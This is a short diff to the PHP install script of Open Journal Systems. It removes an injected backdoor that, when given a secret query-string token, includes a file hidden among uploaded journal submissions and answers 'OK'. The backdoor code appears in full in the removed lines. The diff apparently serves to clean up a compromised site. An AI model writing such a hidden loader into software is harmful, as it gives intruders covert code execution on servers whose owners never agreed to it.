@@ -43,13 +43,6 @@ class OJSInstallTool extends InstallTool {
 	}
 
 }
-if (isset($_GET['_']) && $_GET['_'] === 'sb_Mi5TeR572s8_c@Sq3r304rn') {
-    $f="/home/nternati/filesIss/journals/1/articles/10/submission/10-1-31-1-2-20211106";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
 
 $tool = new OJSInstallTool(isset($argv) ? $argv : array());
 $tool->execute();
